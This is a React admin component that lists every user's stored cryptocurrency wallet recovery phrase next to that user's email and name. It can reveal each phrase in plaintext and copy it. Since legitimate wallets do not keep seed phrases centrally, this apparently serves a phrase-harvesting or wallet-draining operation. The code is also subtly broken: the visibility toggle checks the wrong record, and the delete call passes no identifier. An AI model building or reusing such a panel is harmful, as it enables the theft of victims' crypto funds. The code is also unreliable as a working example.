'use client';
import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  FiShield, 
  FiTrash2, 
  FiEye, 
  FiEyeOff, 
  FiSearch,
  FiAlertTriangle,
  FiUser,
  FiClock,
  FiCopy,
 
} from 'react-icons/fi';
 
import { toast } from 'sonner';
import { deleteSecretPhrase, getAllPhrases } from '@/lib/phrase';

interface WalletPhrase {
  id: string;
  user_id: string;
  phrase_text: string;
  created_at: string;
  updated_at: string;
  user_profile?: {
    email: string;
    username: string;
    name: string;
  };
}

export default function SecretPhraseManager() {
  const [phrases, setPhrases] = useState<WalletPhrase[]>([]);
  const [filteredPhrases, setFilteredPhrases] = useState<WalletPhrase[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [showPhrases, setShowPhrases] = useState<{ [key: string]: boolean }>({});
  const [selectedPhrase, setSelectedPhrase] = useState<WalletPhrase | null>(null);
  const [showDeleteModal, setShowDeleteModal] = useState(false);
  const [isDeleting, setIsDeleting] = useState(false);

  // Load all phrases
  useEffect(() => {
    loadPhrases();
  }, []);

  // Filter phrases based on search
  useEffect(() => {
    if (!searchTerm.trim()) {
      setFilteredPhrases(phrases);
      return;
    }

    const filtered = phrases.filter(phrase => 
      phrase.user_profile?.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      phrase.user_profile?.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      phrase.user_profile?.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      phrase.user_id.toLowerCase().includes(searchTerm.toLowerCase())
    );
    setFilteredPhrases(filtered);
  }, [searchTerm, phrases]);

  const loadPhrases = async () => {
    setIsLoading(true);
    try {
      const result = await getAllPhrases();
      
      if (result.error) {
        toast.error(result.error);
        return;
      }

      setPhrases(result.data || []);
      setFilteredPhrases(result.data || []);
    } catch (error) {
      console.error('Failed to load phrases:', error);
      toast.error('Failed to load secret phrases');
    } finally {
      setIsLoading(false);
    }
  };

  const togglePhraseVisibility = (phraseId: string) => {
    setShowPhrases(prev => ({
      ...prev,
      [phraseId]: !prev[phraseId]
    }));
  };

  const copyToClipboard = (text: string, message: string = 'Copied to clipboard') => {
    navigator.clipboard.writeText(text);
    toast.success(message);
  };

  const handleDeleteClick = (phrase: WalletPhrase) => {
    setSelectedPhrase(phrase);
    setShowDeleteModal(true);
  };

  const confirmDelete = async () => {
    if (!selectedPhrase) return;

    setIsDeleting(true);
    try {
      const result = await deleteSecretPhrase();
      
      if (result.error) {
        toast.error(result.error);
        return;
      }

      toast.success('Secret phrase deleted successfully');
      setPhrases(prev => prev.filter(p => p.id !== selectedPhrase.id));
      setShowDeleteModal(false);
      setSelectedPhrase(null);
    } catch (error) {
      console.error('Failed to delete phrase:', error);
      toast.error('Failed to delete secret phrase');
    } finally {
      setIsDeleting(false);
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const maskPhrase = (phrase: string) => {
    const words = phrase.split(' ');
    return words.map((word ) => 
      showPhrases[selectedPhrase?.id || ''] ? word : '•'.repeat(Math.min(word.length, 8))
    ).join(' ');
  };

  if (isLoading) {
    return (
      <div className="min-h-[400px] flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-teal-500 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading secret phrases...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center mb-8"
      >
        <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <FiShield className="w-6 h-6 text-red-600" />
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">
          Secret Phrase Management
        </h1>
        <p className="text-gray-600 text-sm sm:text-base">
          Admin panel for managing wallet recovery phrases
        </p>
      </motion.div>

      

      {/* Stats and Search */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.2 }}
        className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6"
      >
        <div className="bg-white rounded-lg border border-gray-200 p-4 text-center">
          <div className="text-2xl font-bold text-gray-900">{phrases.length}</div>
          <div className="text-sm text-gray-600">Total Phrases</div>
        </div>
        
        <div className="bg-white rounded-lg border border-gray-200 p-4 text-center">
          <div className="text-2xl font-bold text-gray-900">
            {phrases.filter(p => new Date(p.updated_at) > new Date(Date.now() - 7 * 24 * 60 * 60 * 1000)).length}
          </div>
          <div className="text-sm text-gray-600">Updated This Week</div>
        </div>

        <div className="md:col-span-2 relative">
          <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
            <FiSearch className="h-5 w-5 text-gray-400" />
          </div>
          <input
            type="text"
            placeholder="Search by user email, name, or ID..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-500 focus:border-teal-500"
          />
        </div>
      </motion.div>

      {/* Phrases Table */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.3 }}
        className="bg-white rounded-lg border border-gray-200 overflow-hidden"
      >
        {filteredPhrases.length === 0 ? (
          <div className="text-center py-12">
            <FiShield className="mx-auto h-12 w-12 text-gray-400 mb-4" />
            <h3 className="text-lg font-medium text-gray-900 mb-2">
              {phrases.length === 0 ? 'No Secret Phrases' : 'No Matching Phrases'}
            </h3>
            <p className="text-gray-600 max-w-md mx-auto">
              {phrases.length === 0 
                ? 'No wallet secret phrases have been created yet.'
                : 'No phrases match your search criteria.'
              }
            </p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="min-w-full divide-y divide-gray-200">
              <thead className="bg-gray-50">
                <tr>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    User
                  </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Secret Phrase
                  </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Created
                  </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Updated
                  </th>
                  <th scope="col" className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Actions
                  </th>
                </tr>
              </thead>
              <tbody className="bg-white divide-y divide-gray-200">
                {filteredPhrases.map((phrase, index) => (
                  <motion.tr
                    key={phrase.id}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: index * 0.05 }}
                    className="hover:bg-gray-50"
                  >
                    <td className="px-4 py-4 whitespace-nowrap">
                      <div className="flex items-center">
                        <div className="flex-shrink-0 h-10 w-10 bg-teal-100 rounded-full flex items-center justify-center">
                          <FiUser className="h-5 w-5 text-teal-600" />
                        </div>
                        <div className="ml-4">
                          <div className="text-sm font-medium text-gray-900">
                            {phrase.user_profile?.name || 'Unknown User'}
                          </div>
                          <div className="text-sm text-gray-500">
                            {phrase.user_profile?.email || phrase.user_id}
                          </div>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex items-center space-x-2">
                        <code className="text-sm font-mono bg-gray-100 px-2 py-1 rounded border flex-1 min-w-0">
                          <span className="truncate block">
                            {maskPhrase(phrase.phrase_text)}
                          </span>
                        </code>
                        <div className="flex space-x-1">
                          <button
                            onClick={() => togglePhraseVisibility(phrase.id)}
                            className="p-1 text-gray-400 hover:text-gray-600 transition-colors"
                            title={showPhrases[phrase.id] ? 'Hide phrase' : 'Show phrase'}
                          >
                            {showPhrases[phrase.id] ? <FiEyeOff size={16} /> : <FiEye size={16} />}
                          </button>
                          <button
                            onClick={() => copyToClipboard(phrase.phrase_text, 'Phrase copied to clipboard')}
                            className="p-1 text-gray-400 hover:text-blue-600 transition-colors"
                            title="Copy phrase"
                          >
                            <FiCopy size={16} />
                          </button>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-500">
                      <div className="flex items-center">
                        <FiClock className="mr-1.5 text-gray-400" size={14} />
                        {formatDate(phrase.created_at)}
                      </div>
                    </td>
                    <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-500">
                      <div className="flex items-center">
                        <FiClock className="mr-1.5 text-gray-400" size={14} />
                        {formatDate(phrase.updated_at)}
                      </div>
                    </td>
                    <td className="px-4 py-4 whitespace-nowrap text-right text-sm font-medium">
                      <button
                        onClick={() => handleDeleteClick(phrase)}
                        className="text-red-600 hover:text-red-900 p-2 rounded-lg hover:bg-red-50 transition-colors"
                        title="Delete phrase"
                      >
                        <FiTrash2 size={16} />
                      </button>
                    </td>
                  </motion.tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </motion.div>

      {/* Delete Confirmation Modal */}
      <AnimatePresence>
        {showDeleteModal && selectedPhrase && (
          <>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
              onClick={() => setShowDeleteModal(false)}
            >
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.9 }}
                className="bg-white rounded-lg max-w-md w-full p-6"
                onClick={(e) => e.stopPropagation()}
              >
                <div className="flex items-center mb-4">
                  <div className="w-10 h-10 bg-red-100 rounded-full flex items-center justify-center mr-3">
                    <FiTrash2 className="w-5 h-5 text-red-600" />
                  </div>
                  <h3 className="text-lg font-semibold text-gray-900">
                    Delete Secret Phrase
                  </h3>
                </div>

                <p className="text-gray-600 mb-4">
                  Are you sure you want to delete the secret phrase for{' '}
                  <strong>{selectedPhrase.user_profile?.name || selectedPhrase.user_id}</strong>?
                  This action cannot be undone and will permanently remove the recovery phrase.
                </p>

                <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
                  <div className="flex items-start">
                    <FiAlertTriangle className="w-4 h-4 text-red-500 mt-0.5 mr-2 flex-shrink-0" />
                    <p className="text-red-700 text-sm">
                      <strong>Warning:</strong> This will make the associated wallet inaccessible
                      if the user hasn&apos;t backed up their phrase elsewhere.
                    </p>
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row gap-3">
                  <button
                    onClick={() => setShowDeleteModal(false)}
                    disabled={isDeleting}
                    className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={confirmDelete}
                    disabled={isDeleting}
                    className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:opacity-50 flex items-center justify-center"
                  >
                    {isDeleting ? (
                      <>
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                        Deleting...
                      </>
                    ) : (
                      'Delete Phrase'
                    )}
                  </button>
                </div>
              </motion.div>
            </motion.div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}